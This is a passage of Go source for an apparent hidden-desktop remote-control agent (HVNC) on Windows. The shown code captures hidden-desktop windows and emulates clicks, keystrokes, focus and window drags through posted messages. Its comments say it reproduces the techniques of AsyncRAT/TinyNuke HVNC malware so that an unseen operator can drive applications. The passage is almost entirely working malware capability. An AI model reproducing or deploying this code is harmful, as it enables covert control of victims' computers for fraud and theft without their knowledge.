        tret, _, _ := procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
        return backstageDesktopNameOfThread(uint32(tret))
}

var backstagePumpProbeMu sync.Mutex
var backstagePumpProbeAt = map[uintptr]int64{}

// backstagePumpProbe verifies the target window's UI thread is actually
// pumping. A blocked thread still shows its LAST rendered frame in a DWM
// thumbnail composite, so a hung window is indistinguishable from a live one
// in the stream — except posted input is never processed. Healthy threads
// answer WM_NULL instantly; the probe is cached per hwnd for 2 seconds.
func backstagePumpProbe(hwnd uintptr) string {
        now := time.Now().UnixNano()
        backstagePumpProbeMu.Lock()
        if len(backstagePumpProbeAt) > 512 {
                backstagePumpProbeAt = map[uintptr]int64{}
        }
        last := backstagePumpProbeAt[hwnd]
        if now-last < int64(2*time.Second) {
                backstagePumpProbeMu.Unlock()
                return "cached"
        }
        backstagePumpProbeAt[hwnd] = now
        backstagePumpProbeMu.Unlock()
        var dummy uintptr
        r, _, _ := procSendMessageTimeoutW.Call(
                hwnd,
                0, // WM_NULL
                0,
                0,
                SMTO_ABORTIFHUNG,
                400,
                uintptr(unsafe.Pointer(&dummy)),
        )
        if r == 0 {
                return "THREAD-NOT-PUMPING"
        }
        return "pumping"
}

const (
        bsInClassProgman      = "Progman"
        bsInClassWorkerW      = "WorkerW"
        bsInClassShellDefView = "SHELLDLL_DefView"
        bsInClassSysList      = "SysListView32"
)

func backstageFindChildWindowByClass(parent uintptr, class string) uintptr {
        clsPtr, err := syscall.UTF16PtrFromString(class)
        if err != nil {
                return 0
        }
        r, _, _ := procFindWindowExW.Call(parent, 0, uintptr(unsafe.Pointer(clsPtr)), 0)
        return r
}

// backstageResolveClientTarget drills a click on the desktop surface down to
// the icon list view. WindowFromPoint can resolve the shell root (Progman) or
// a WorkerW host instead of the SysListView32 that actually processes
// selection, rubber-band and the desktop context menu; posting click messages
// to the shell root is a silent no-op. For every other window this is the
// identity function.
func backstageResolveClientTarget(hit uintptr) uintptr {
        if hit == 0 {
                return 0
        }
        cls := getWindowClassName(hit)
        if cls != bsInClassProgman && cls != bsInClassWorkerW {
                return hit
        }
        if defview := backstageFindChildWindowByClass(hit, bsInClassShellDefView); defview != 0 {
                if list := backstageFindChildWindowByClass(defview, bsInClassSysList); list != 0 {
                        backstageLogf("%s: desktop surface click redirected %s -> SysListView32 (hwnd=0x%x)", backstageInputEngineVersion, cls, list)
                        return list
                }
        }
        // Multi-monitor/multi-shell topology: SHELLDLL_DefView may be parked
        // under a WorkerW sibling instead of Progman. Walk down the z-order
        // from the clicked root and check WorkerW siblings.
        sibling := rootWindow(hit)
        for i := 0; i < 8 && sibling != 0; i++ {
                sibling = getWindow(sibling, GW_HWNDNEXT)
                if sibling == 0 {
                        break
                }
                if getWindowClassName(sibling) != bsInClassWorkerW {
                        continue
                }
                if defview := backstageFindChildWindowByClass(sibling, bsInClassShellDefView); defview != 0 {
                        if list := backstageFindChildWindowByClass(defview, bsInClassSysList); list != 0 {
                                backstageLogf("%s: desktop surface click redirected via sibling WorkerW -> SysListView32 (hwnd=0x%x)", backstageInputEngineVersion, list)
                                return list
                        }
                }
        }
        return hit
}

// ---------------------------------------------------------------------------
// DPI awareness (process-wide, package load time).
//
// Windows virtualizes coordinate APIs for DPI-unaware processes:
// GetWindowRect / WindowFromPoint / ScreenToClient / monitor metrics return
// scaled values, while DPI-aware targets (Explorer, Chromium, modern
// toolkits) run in physical pixels. On any display above 100% scale every
// posted lParam, hit-test probe and WindowFromPoint call lands offset and
// compressed — native apps then ignore clicks and title-bar zones shift.
// The capture pipeline (DXGI) is always physical, so unaware coordinates
// also misaligned the operator cursor against captured frames.
// Per-Monitor-V2 awareness keeps every coordinate physical end to end.
// ---------------------------------------------------------------------------

const backstageDpiContextPerMonitorV2 = ^uintptr(3) // DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 = (HANDLE)-4

func backstageEnsureDPIAwareness() {
        if r, _, _ := procSetProcessDpiAwareCtx.Call(backstageDpiContextPerMonitorV2); r != 0 {
                log.Printf("backstage: DPI awareness PerMonitorV2 active")
                return
        }
        if r, _, _ := procSetProcessDPIAware.Call(); r != 0 {
                log.Printf("backstage: DPI awareness system-level active")
        }
}

func init() {
        backstageEnsureDPIAwareness()
        backstageLogf("%s: input engine active — research-exact posted clicks (no activation shim, no hover priming), desktop-surface redirect, per-click forensics with pump+desktop probes; file log: backstage-input.log next to the agent", backstageInputEngineVersion)
}

// ---------------------------------------------------------------------------
// Hardened message-emulation input engine.
//
// SendInput is architecturally unusable on a hidden desktop: the kernel
// gates NtUserSendInput on IntIsActiveDesktop(pti->rpdesk) and rejects it
// with ERROR_ACCESS_DENIED unless the calling thread's desktop is the
// ACTIVE input desktop — a hidden desktop never is. This is why every
// field-proven HVNC (AsyncRAT/TinyNuke family) uses posted-message
// emulation, and why TightVNC's SendInput path only works because it owns
// the active desktop of a real session.
//
// The engine below emulates the full OS click pipeline manually:
// WM_NCHITTEST probe -> caption/button/edge actions, activation shim,
// client-coordinate conversion, double-click timing, the #32768 popup-menu
// screen-coordinate quirk, and SetWindowPos-based move/resize tracking.
// ---------------------------------------------------------------------------

// backstageHandlePopupClick clicks an item inside a native popup-menu window
// (class #32768). Menu windows run their own modal loop but DO accept posted
// mouse messages — with one quirk: they interpret mouse lParams as SCREEN
// coordinates, unlike normal windows which expect client coordinates. The
// down/up pair is routed with screen coordinates to the menu window; if the
// click resolves outside the menu, it is still posted to the menu so the
// menu dismisses itself (field-proven HVNC behavior).
func backstageHandlePopupClick(hwnd uintptr, pt point) bool {
        menu := hwnd
        if getWindowClassName(menu) != bsInMenuClass {
                // A menu is open somewhere but the point resolved elsewhere —
                // route the click to the menu anyway so it can dismiss itself.
                menu = findbackstageMenuWindow()
                if menu == 0 {
                        return false
                }
        }
        // Windows keeps per-queue menu windows ALIVE (hidden) after the popup
        // closes. Without a visibility check FindWindow("#32768") still finds
        // the stale hidden window, and every left click on the desktop is
        // then intercepted, posted to the invisible menu, and silently eaten.
        // An actually-open popup menu is always visible.
        if r, _, _ := procIsWindowVisible.Call(menu); r == 0 {
                return false
        }
        postMouseMessage(menu, WM_LBUTTONDOWN, MK_LBUTTON, pt)
        backstageInputMu.Lock()
        backstageMenuClickHwnd = menu
        backstageInputMu.Unlock()
        return true
}

func findbackstageMenuWindow() uintptr {
        cls, err := syscall.UTF16PtrFromString(bsInMenuClass)
        if err != nil {
                return 0
        }
        r, _, _ := procFindWindowW.Call(uintptr(unsafe.Pointer(cls)), 0)
        return r
}

// backstageIsDoubleClick reports whether this left-button down completes a
// double click and records the click for the next evaluation. The OS does
// this automatically for real input; this exists for the emulation fallback.
func backstageIsDoubleClick(button int, pt point) bool {
        now := time.Now().UnixMilli()
        backstageInputMu.Lock()
        defer backstageInputMu.Unlock()
        lastMs := backstageLastClickMs
        lastX := backstageLastClickX
        lastY := backstageLastClickY
        lastBtn := backstageLastClickBtn
        backstageLastClickMs = now
        backstageLastClickX = pt.x
        backstageLastClickY = pt.y
        backstageLastClickBtn = button
        if lastMs == 0 || lastBtn != button {
                return false
        }
        dx := int64(pt.x - lastX)
        if dx < 0 {
                dx = -dx
        }
        dy := int64(pt.y - lastY)
        if dy < 0 {
                dy = -dy
        }
        timeout := int64(500)
        if r, _, _ := procbackstageDblClickTime.Call(); r != 0 {
                timeout = int64(uint32(r))
        }
        return now-lastMs <= timeout && dx <= bsInDblClickPx && dy <= bsInDblClickPx
}

// backstageActivateWindowForClick establishes REAL focus/activation state on
// the hidden desktop before a posted click lands — the TightVNC server
// method (AttachThreadInput -> SetForegroundWindow/SetActiveWindow/SetFocus).
// Real APIs generate the true message chain (WM_ACTIVATE/WM_NCACTIVATE/
// WM_KILLFOCUS/WM_SETFOCUS with correct wParams), so GetFocus() and
// GetForegroundWindow() inside the target app agree with the messages it
// receives. The previous posted WM_SETFOCUS/WM_ACTIVATE shim left those
// APIs disagreeing with the fake messages, and apps that verify the
// consistency dropped the click.
func backstageActivateWindowForClick(root, hit uintptr, switching bool) {
        if root == 0 || hit == 0 {
                return
        }
        var pid uint32
        tret, _, _ := procGetWindowThreadProcessId.Call(hit, uintptr(unsafe.Pointer(&pid)))
        targetThread := uint32(tret)
        ourThread, _, _ := procGetCurrentThreadId.Call()
        attached := false
        if targetThread != 0 && targetThread != uint32(ourThread) {
                if r, _, _ := procAttachThreadInput.Call(ourThread, uintptr(targetThread), 1); r != 0 {
                        attached = true
                }
        }
        if switching {
                procSetForegroundWindow.Call(root)
        }
        procSetActiveWindow.Call(root)
        procSetFocus.Call(hit)
        if attached {
                procAttachThreadInput.Call(ourThread, uintptr(targetThread), 0)
        }
}

func setPendingActivation(hwnd uintptr) {
        backstageInputMu.Lock()
        backstagePendingActivate = hwnd
        backstageInputMu.Unlock()
}

func consumePendingActivation() uintptr {
        backstageInputMu.Lock()
        defer backstageInputMu.Unlock()
        hwnd := backstagePendingActivate
        backstagePendingActivate = 0
        return hwnd
}

func postKeyMessage(hwnd uintptr, msg uint32, vk uint16) {
        scan := mapVirtualKey(uint32(vk))
        lparam := uintptr(1 | (scan << 16))
        if msg == WM_KEYUP {
                lparam |= 1 << 30
                lparam |= 1 << 31
        }
        procPostMessageW.Call(hwnd, uintptr(msg), uintptr(vk), lparam)
}

func setMouseButton(button int, down bool) uint32 {
        backstageInputMu.Lock()
        defer backstageInputMu.Unlock()
        var mask uint32
        switch button {
        case 0:
                mask = MK_LBUTTON
        case 1:
                mask = MK_MBUTTON
        case 2:
                mask = MK_RBUTTON
        default:
                return backstageMouseButtons
        }
        if down {
                backstageMouseButtons |= mask
        } else {
                backstageMouseButtons &^= mask
        }
        return backstageMouseButtons
}

func currentMouseButtons() uint32 {
        backstageInputMu.Lock()
        defer backstageInputMu.Unlock()
        return backstageMouseButtons
}

func mapVirtualKey(vk uint32) uintptr {
        r, _, _ := procMapVirtualKeyW.Call(uintptr(vk), 0)
        return r
}

func virtualKeyToChars(vk uint16) []rune {
        buf := make([]uint16, 8)
        state := buildKeyboardState()
        ret, _, _ := procToUnicode.Call(
                uintptr(vk),
                mapVirtualKey(uint32(vk)),
                uintptr(unsafe.Pointer(&state[0])),
                uintptr(unsafe.Pointer(&buf[0])),
                uintptr(len(buf)),
                0,
        )
        if ret == 0 {
                return nil
        }
        if ret < 0 {
                ret = -ret
        }
        return []rune(syscall.UTF16ToString(buf[:ret]))
}

func isWindowMaximized(hwnd uintptr) bool {
        type windowPlacement struct {
                length         uint32
                flags          uint32
                showCmd        uint32
                ptMinPositionX int32
                ptMinPositionY int32
                ptMaxPositionX int32
                ptMaxPositionY int32
                rcNormalLeft   int32
                rcNormalTop    int32
                rcNormalRight  int32
                rcNormalBottom int32
        }
        var wp windowPlacement
        wp.length = uint32(unsafe.Sizeof(wp))
        procGetWindowPlacement.Call(hwnd, uintptr(unsafe.Pointer(&wp)))
        return wp.showCmd == SW_SHOWMAXIMIZED
}

func safeNCHitTest(hwnd uintptr, lparam uintptr) int32 {
        const timeoutMs = 75
        var result uintptr
        r, _, _ := procSendMessageTimeoutW.Call(
                hwnd,
                WM_NCHITTEST,
                0,
                lparam,
                SMTO_ABORTIFHUNG,
                timeoutMs,
                uintptr(unsafe.Pointer(&result)),
        )
        if r == 0 {
                return 0
        }
        return int32(result)
}

func movebackstageWindowIfDragging(screenPt point) {
        backstageInputMu.Lock()
        moving := backstageMovingWindow
        hwnd := backstageWindowToMove
        offset := backstageMoveOffset
        size := backstageWindowSize
        edge := backstageResizeEdge
        orig := backstageResizeOrig
        backstageInputMu.Unlock()
        if !moving || hwnd == 0 {
                return
        }
        if edge != 0 {
                applybackstageWindowResize(hwnd, orig, int(edge), int(screenPt.x), int(screenPt.y))
                return
        }
        newX := int32(screenPt.x) - offset.x
        newY := int32(screenPt.y) - offset.y
        procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

func endbackstageWindowDrag(screenPt point) {
        backstageInputMu.Lock()
        moving := backstageMovingWindow
        hwnd := backstageWindowToMove
        offset := backstageMoveOffset
        size := backstageWindowSize
        edge := backstageResizeEdge
        orig := backstageResizeOrig
        backstageMovingWindow = false
        backstageWindowToMove = 0
        backstageResizeEdge = 0
        backstageInputMu.Unlock()
        if !moving || hwnd == 0 {
                return
        }
        if edge != 0 {
                applybackstageWindowResize(hwnd, orig, int(edge), int(screenPt.x), int(screenPt.y))
                return
        }
        newX := int32(screenPt.x) - offset.x
        newY := int32(screenPt.y) - offset.y
        procSetWindowPos.Call(hwnd, 0, uintptr(newX), uintptr(newY), uintptr(size.x), uintptr(size.y), 0)
}

// applybackstageWindowResize resizes a window from one of its edges during an
// emulated HT* resize drag (HTLEFT..HTBOTTOMRIGHT). Emulates what the real
// modal size loop would do.
func applybackstageWindowResize(hwnd uintptr, orig rect, edge, x, y int) {
        r := orig
        switch {
        case edge == HTLEFT:
                r.left = int32(x)
        case edge == HTRIGHT:
                r.right = int32(x)
        case edge == HTTOP:
                r.top = int32(y)
        case edge == HTBOTTOM:
                r.bottom = int32(y)
        case edge == HTTOPLEFT:
                r.left = int32(x)
                r.top = int32(y)
        case edge == HTTOPRIGHT:
                r.right = int32(x)
                r.top = int32(y)
        case edge == HTBOTTOMLEFT:
                r.left = int32(x)
                r.bottom = int32(y)
        case edge == HTBOTTOMRIGHT:
                r.right = int32(x)
                r.bottom = int32(y)
        default:
                return
        }
        if r.right-r.left < bsInMinResizeW {
                if edge == HTLEFT || edge == HTTOPLEFT || edge == HTBOTTOMLEFT {
                        r.left = r.right - bsInMinResizeW
                } else {
                        r.right = r.left + bsInMinResizeW
                }
        }
        if r.bottom-r.top < bsInMinResizeH {
                if edge == HTTOP || edge == HTTOPLEFT || edge == HTTOPRIGHT {
                        r.top = r.bottom - bsInMinResizeH
                } else {
                        r.bottom = r.top + bsInMinResizeH
                }
        }
        procSetWindowPos.Call(
                hwnd,
                0,
                uintptr(uint32(int32(r.left))),
                uintptr(uint32(int32(r.top))),
                uintptr(uint32(int32(r.right-r.left))),
                uintptr(uint32(int32(r.bottom-r.top))),
                0,
        )
}

func backstageMouseWheelOnThread(delta int32) error {
        pt := currentbackstageCursor()
        backstageSyncCursor(pt)
        hwnd := windowFromPoint(pt)
        if hwnd == 0 {
                hwnd = getWorkingWindow()
                if hwnd == 0 {
                        return nil
                }
        }

        if backstageUIAEnabled.Load() && isWinUI3Window(hwnd) {
                return uiaHandleMouseWheel(hwnd, pt, delta)
        }

        hwnd = backstageResolveClientTarget(hwnd)
        wparam := (uintptr(uint16(delta)) << 16) | uintptr(currentMouseButtons())
        procPostMessageW.Call(hwnd, WM_MOUSEWHEEL, wparam, makeLParam(pt.x, pt.y))
        return nil
}

func isNonPrintableVK(vk uint16) bool {
        if vk >= 0x70 && vk <= 0x7B { // F1-F12
                return true
        }
        switch vk {
        case 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28: // PageUp/Down, End, Home, Arrows
                return true
        case 0x2D, 0x2E: // Insert, Delete
                return true
        case 0x5B, 0x5C, 0x5D: // Win, Win, Apps
                return true
        case 0x91, 0x90: // Scroll, NumLock
                return true
        case 0x0D, 0x1B, 0x09, 0x08: // Enter, Escape, Tab, Backspace
                return true
        case 0x10, 0xA0, 0xA1, 0x11, 0xA2, 0xA3, 0x12, 0xA4, 0xA5, 0x14:
                return true
        default:
                return false
        }
}

func isModifierVK(vk uint16) bool {
        switch vk {
        case VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCONTROL, VK_RCONTROL, VK_MENU, VK_LMENU, VK_RMENU, VK_CAPITAL:
                return true
        default:
                return false
        }
}

func updateModifierState(vk uint16, down bool) {
        backstageInputMu.Lock()
        defer backstageInputMu.Unlock()
        switch vk {
        case VK_SHIFT, VK_LSHIFT, VK_RSHIFT:
                backstageShiftDown = down
        case VK_CONTROL, VK_LCONTROL, VK_RCONTROL:
                backstageCtrlDown = down
        case VK_MENU, VK_LMENU, VK_RMENU:
                backstageAltDown = down
        case VK_CAPITAL:
                if down {
                        backstageCapsLock = !backstageCapsLock
                }
        }
}

func buildKeyboardState() []byte {
        state := make([]byte, 256)
        backstageInputMu.Lock()
        shift := backstageShiftDown
        ctrl := backstageCtrlDown
        alt := backstageAltDown
        caps := backstageCapsLock
        backstageInputMu.Unlock()
        if shift {
                state[VK_SHIFT] = 0x80
        }
        if ctrl {
                state[VK_CONTROL] = 0x80
        }
        if alt {
                state[VK_MENU] = 0x80
        }
        if caps {
                state[VK_CAPITAL] = 0x01
        }
        return state
}

func BackstageMonitorCount() int {
        return displayCount()
}

func backstageResolveCaptureBounds(display int) (image.Rectangle, string) {
        mons := monitorList()
        if display >= 0 && display < len(mons) {
                mon := mons[display]
                bounds := captureBounds(mon)
                if bounds.Dx() > 0 && bounds.Dy() > 0 {
                        return bounds, fmt.Sprintf("monitor=%d name=%q", display, mon.name)
                }
        }
        if desktopBounds, ok := backstageDesktopBounds(); ok {
                return desktopBounds, "desktop"
        }
        vx := int(getSystemMetric(SM_XVIRTUALSCREEN))
        vy := int(getSystemMetric(SM_YVIRTUALSCREEN))
        vw := int(getSystemMetric(SM_CXVIRTUALSCREEN))
        vh := int(getSystemMetric(SM_CYVIRTUALSCREEN))
        if vw > 0 && vh > 0 {
                return image.Rect(vx, vy, vx+vw, vy+vh), "virtual"
        }
        return image.Rectangle{}, "unknown"
}

func drawbackstageWindowsToBuffer(hdcScreen uintptr, bounds image.Rectangle, target []byte, targetStride int) int {
        hwnd := getTopWindow(0)
        if hwnd == 0 {
                return 0
        }
        hwnd = getWindow(hwnd, GW_HWNDLAST)
        if hwnd == 0 {
                return 0
        }

        // Initialize cache if needed
        if backstageWinCache == nil {
                backstageWinCache = make(map[uintptr]*backstageWinCacheEntry)
        }

        // Track which windows are still alive this frame
        alive := make(map[uintptr]bool)

        drawn := 0
        for hwnd != 0 {
                if !backstageIsDWMHost(hwnd) && drawbackstageWindow(hdcScreen, hwnd, bounds, target, targetStride) {
                        drawn++
                }
                alive[hwnd] = true
                hwnd = getWindow(hwnd, GW_HWNDPREV)
        }

        // Evict cache entries for windows that no longer exist
        for h := range backstageWinCache {
                if !alive[h] {
                        backstageRemoveWindowCacheEntry(h)
                }
        }
        for h := range backstageHungWindows {
                if !alive[h] {
                        delete(backstageHungWindows, h)
                }
        }

        return drawn
}

func backstageGetOrCreateCache(hdcScreen uintptr, hwnd uintptr, w, h int) *backstageWinCacheEntry {
        entryBytes, valid := backstageWindowCacheByteSize(w, h)
        if !valid || entryBytes > backstageMaxWindowCacheBytes {
                return nil
        }
        backstageWinCacheSeq++
        entry, ok := backstageWinCache[hwnd]
        if ok && entry.w == w && entry.h == h && entry.hdcMem != 0 && entry.hbmp != 0 {
                entry.age = 0
                entry.usedAt = backstageWinCacheSeq
                return entry
        }
        if ok {
                backstageRemoveWindowCacheEntry(hwnd)
        }
        for len(backstageWinCache) >= backstageMaxWindowCacheEntries || backstageWinCacheBytes+entryBytes > backstageMaxWindowCacheBytes {
                var oldestHandle uintptr
                var oldestSeq uint64
                found := false
                for handle, candidate := range backstageWinCache {
                        if !found || candidate.usedAt < oldestSeq {
                                oldestHandle = handle
                                oldestSeq = candidate.usedAt
                                found = true
                        }
                }
                if !found {
                        return nil
                }
                backstageRemoveWindowCacheEntry(oldestHandle)
        }
        hdcMem := createCompatibleDC(hdcScreen)
        if hdcMem == 0 {
                return nil
        }
        bmi := bitmapInfo{
                bmiHeader: bitmapInfoHeader{
                        biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
                        biWidth:       int32(w),
                        biHeight:      -int32(h),
                        biPlanes:      1,
                        biBitCount:    32,
                        biCompression: BI_RGB,
                },
        }
        var bits unsafe.Pointer
        hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
        if hbmp == 0 || bits == nil {
                deleteDC(hdcMem)
                return nil
        }
        selectObject(hdcMem, hbmp)

        entry = &backstageWinCacheEntry{
                hdcMem: hdcMem,
                hbmp:   hbmp,
                bits:   bits,
                w:      w,
                h:      h,
                bytes:  entryBytes,
                usedAt: backstageWinCacheSeq,
        }
        backstageWinCache[hwnd] = entry
        backstageWinCacheBytes += entryBytes
        return entry
}

func backstageWindowCacheByteSize(w, h int) (int64, bool) {
        if w <= 0 || h <= 0 || int64(w) > (1<<63-1)/int64(h)/4 {
                return 0, false
        }
        return int64(w) * int64(h) * 4, true
}

func backstageRemoveWindowCacheEntry(hwnd uintptr) {
        entry := backstageWinCache[hwnd]
        if entry == nil {
                return
        }
        backstageFreeCacheEntry(entry)
        delete(backstageWinCache, hwnd)
        backstageWinCacheBytes -= entry.bytes
        if backstageWinCacheBytes < 0 {
                backstageWinCacheBytes = 0
        }
}

func backstageDetachWindowCacheEntry(hwnd uintptr, entry *backstageWinCacheEntry) bool {
        if backstageWinCache[hwnd] != entry {
                return false
        }
        delete(backstageWinCache, hwnd)
        backstageWinCacheBytes -= entry.bytes
        if backstageWinCacheBytes < 0 {
                backstageWinCacheBytes = 0
        }
        return true
}

func backstageClearWindowCache() {
        for hwnd := range backstageWinCache {
                backstageRemoveWindowCacheEntry(hwnd)
        }
        backstageWinCache = nil
        backstageWinCacheBytes = 0
}

func backstageFreeCacheEntry(entry *backstageWinCacheEntry) {
        if entry.hbmp != 0 {
                deleteObject(entry.hbmp)
        }
        if entry.hdcMem != 0 {
                deleteDC(entry.hdcMem)
        }
}

var backstageUIAEnabled atomic.Bool
var backstagePrintWindowFallbackEnabled atomic.Bool
var backstagePrintWindowFallbackLogNs atomic.Int64
var backstagePrintWindowTimeoutLogNs atomic.Int64
var backstagePrintWindowFn = printWindow

func init() {
        backstageUIAEnabled.Store(false) // disabled by default
        backstagePrintWindowFallbackEnabled.Store(true)
}

func SetbackstageDXGIEnabled(_ bool) {
}

func GetbackstageDXGIEnabled() bool {
        return false
}

func SetbackstageUIAEnabled(enabled bool) {
        backstageUIAEnabled.Store(enabled)
}

func GetbackstageUIAEnabled() bool {
        return backstageUIAEnabled.Load()
}

func SetbackstagePrintWindowFallbackEnabled(enabled bool) {
        backstagePrintWindowFallbackEnabled.Store(enabled)
}

func GetbackstagePrintWindowFallbackEnabled() bool {
        return backstagePrintWindowFallbackEnabled.Load()
}

func backstagePrintWindowWithTimeout(hwnd uintptr, entry *backstageWinCacheEntry) bool {
        if backstageHungWindows == nil {
                backstageHungWindows = make(map[uintptr]struct{})
        }
        if _, quarantined := backstageHungWindows[hwnd]; quarantined {
                return false
        }

        var ownership atomic.Int32 // 0=racing, 1=caller keeps cache, 2=worker frees detached cache
        done := make(chan bool, 1)
        go func() {
                ok := false
                func() {
                        defer func() { _ = recover() }()
                        ok = backstagePrintWindowFn(hwnd, entry.hdcMem, PW_RENDERFULLCONTENT)
                }()
                if ownership.CompareAndSwap(0, 1) {
                        done <- ok
                        return
                }
                backstageFreeCacheEntry(entry)
        }()

        timer := time.NewTimer(backstagePrintWindowTimeout)
        defer timer.Stop()
        select {
        case ok := <-done:
                return ok
        case <-timer.C:
                if !ownership.CompareAndSwap(0, 2) {
                        return <-done
                }
                backstageDetachWindowCacheEntry(hwnd, entry)
                backstageHungWindows[hwnd] = struct{}{}
                now := time.Now().UnixNano()
                last := backstagePrintWindowTimeoutLogNs.Load()
                if now-last > int64(5*time.Second) && backstagePrintWindowTimeoutLogNs.CompareAndSwap(last, now) {
                        log.Printf("backstage capture: PrintWindow timed out for hwnd=0x%x; quarantining window", hwnd)
                }
                return false
        }
}

func drawbackstageWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
        if backstageIsDWMHost(hwnd) {
                return false
        }
        if !isWindowVisible(hwnd) {
                return false
        }
        var r rect
        ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
        if ok == 0 {
                return false
        }
        winLeft := int(r.left)
        winTop := int(r.top)
        winRight := int(r.right)
        winBottom := int(r.bottom)
        if winRight <= winLeft || winBottom <= winTop {
                return false
        }
        if winRight <= bounds.Min.X || winLeft >= bounds.Max.X || winBottom <= bounds.Min.Y || winTop >= bounds.Max.Y {
                return false
        }

        winW := winRight - winLeft
        winH := winBottom - winTop
        if winW <= 0 || winH <= 0 {
                return false
        }

        if !backstagePrintWindowFallbackEnabled.Load() {
                now := time.Now().UnixNano()
                last := backstagePrintWindowFallbackLogNs.Load()
                if now-last > int64(5*time.Second) &&
                        backstagePrintWindowFallbackLogNs.CompareAndSwap(last, now) {
                        log.Printf("backstage capture: per-window PrintWindow fallback is disabled")
                }
                return false
        }

        // Use pooled DC+DIB from cache
        entry := backstageGetOrCreateCache(hdcScreen, hwnd, winW, winH)
        if entry == nil {
                return false
        }

        if !backstagePrintWindowWithTimeout(hwnd, entry) {
                if backstageWinCache[hwnd] != entry {
                        return false
                }
                entry.lastOK = false
                entry.age++
                return false
        }
        entry.lastOK = true

        buf := unsafe.Slice((*byte)(entry.bits), winW*winH*4)
        winStride := winW * 4

        effTop, effLeft, effBottom, effRight := 0, 0, winH, winW

        topFound := false
        for y := 0; y < winH; y++ {
                rowBase := y * winStride
                for x := 0; x < winW; x++ {
                        off := rowBase + x*4
                        // Treat a pixel as content when ANY byte (incl.
                        // alpha) is non-zero: a pure-RGB test cropped
                        // dark-themed apps into random sub-rectangles and
                        // made black windows vanish.
                        if buf[off]|buf[off+1]|buf[off+2]|buf[off+3] != 0 {
                                effTop = y
                                topFound = true
                                break
                        }
                }
                if topFound {
                        break
                }
        }
        if !topFound {
                return false
        }

        for y := winH - 1; y > effTop; y-- {
                rowBase := y * winStride
                found := false
                for x := 0; x < winW; x++ {
                        off := rowBase + x*4
                        if buf[off]|buf[off+1]|buf[off+2]|buf[off+3] != 0 {
                                found = true
                                break
                        }
                }
                if found {
                        effBottom = y + 1
                        break
                }
        }

        leftFound := false
        for x := 0; x < winW; x++ {
                for y := effTop; y < effBottom; y++ {
                        off := y*winStride + x*4
                        if buf[off]|buf[off+1]|buf[off+2]|buf[off+3] != 0 {
                                effLeft = x
                                leftFound = true
                                break
                        }
                }
                if leftFound {
                        break
                }
        }

        for x := winW - 1; x > effLeft; x-- {
                found := false
                for y := effTop; y < effBottom; y++ {
                        off := y*winStride + x*4
                        if buf[off]|buf[off+1]|buf[off+2]|buf[off+3] != 0 {
                                found = true
                                break
                        }
                }
                if found {
                        effRight = x + 1
                        break
                }
        }

        effWinLeft := winLeft + effLeft
        effWinTop := winTop + effTop
        effWinRight := winLeft + effRight
        effWinBottom := winTop + effBottom

        interLeft := maxInt(effWinLeft, bounds.Min.X)
        interTop := maxInt(effWinTop, bounds.Min.Y)
        interRight := minInt(effWinRight, bounds.Max.X)
        interBottom := minInt(effWinBottom, bounds.Max.Y)
        if interRight <= interLeft || interBottom <= interTop {
                return false
        }

        srcX := interLeft - winLeft
        srcY := interTop - winTop
        dstX := interLeft - bounds.Min.X
        dstY := interTop - bounds.Min.Y
        copyW := interRight - interLeft
        copyH := interBottom - interTop

        for y := 0; y < copyH; y++ {
                srcStart := (srcY+y)*winStride + srcX*4
                dstStart := (dstY+y)*targetStride + dstX*4
                copy(target[dstStart:dstStart+copyW*4], buf[srcStart:srcStart+copyW*4])
        }

        return true
}

func maxInt(a, b int) int {
        if a > b {
                return a
        }
        return b
}

func minInt(a, b int) int {
        if a < b {
                return a
        }
        return b
}

var (
        procGetWindowTextW    = user32.NewProc("GetWindowTextW")
        procGetWindowTextLenW = user32.NewProc("GetWindowTextLengthW")
)

type BackstageWindowInfo struct {
        HWND        uintptr
        Title       string
        X           int
        Y           int
        Width       int
        Height      int
        PID         uint32
        ProcessName string
        Monitor     int // -1 if not on any known monitor
        Visible     bool
}

func BackstageEnumWindows() ([]BackstageWindowInfo, []BackstageMonitorInfo) {
        backstageDesktopMu.Lock()
        deskHandle := backstageDesktopHandle
        backstageDesktopMu.Unlock()
        if deskHandle == 0 {
                return nil, nil
        }

        mons := monitorList()
        monInfos := make([]BackstageMonitorInfo, len(mons))
        for i, m := range mons {
                monInfos[i] = BackstageMonitorInfo{
                        Index:   i,
                        Name:    m.name,
                        X:       m.rect.Min.X,
                        Y:       m.rect.Min.Y,
                        Width:   m.rect.Dx(),
                        Height:  m.rect.Dy(),
                        Primary: m.primary,
                }
        }

        type rawWin struct {
                hwnd uintptr
        }
        var windows []rawWin

        cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
                if backstageIsDWMHost(hwnd) {
                        return 1
                }
                windows = append(windows, rawWin{hwnd: hwnd})
                return 1
        })
        procEnumDesktopWindows.Call(deskHandle, cb, 0)

        var result []BackstageWindowInfo
        for _, w := range windows {
                if !isWindowVisible(w.hwnd) {
                        continue
                }
                var r rect
                ok, _, _ := procGetWindowRect.Call(w.hwnd, uintptr(unsafe.Pointer(&r)))
                if ok == 0 {
                        continue
                }
                winW := int(r.right - r.left)
                winH := int(r.bottom - r.top)
                if winW <= 0 || winH <= 0 {
                        continue
                }

                title := getWindowText(w.hwnd)
                if title == "" {
                        continue
                }

                var pid uint32
                procGetWindowThreadProcessId.Call(w.hwnd, uintptr(unsafe.Pointer(&pid)))

                procName := ""
                if pid != 0 {
                        procName = getProcessName(pid)
                }

                winLeft := int(r.left)
                winTop := int(r.top)
                monIdx := -1
                bestOverlap := 0
                for i, m := range mons {
                        overlapLeft := maxInt(winLeft, m.rect.Min.X)
                        overlapTop := maxInt(winTop, m.rect.Min.Y)
                        overlapRight := minInt(winLeft+winW, m.rect.Max.X)
                        overlapBottom := minInt(winTop+winH, m.rect.Max.Y)
                        if overlapRight > overlapLeft && overlapBottom > overlapTop {
                                area := (overlapRight - overlapLeft) * (overlapBottom - overlapTop)
                                if area > bestOverlap {
                                        bestOverlap = area
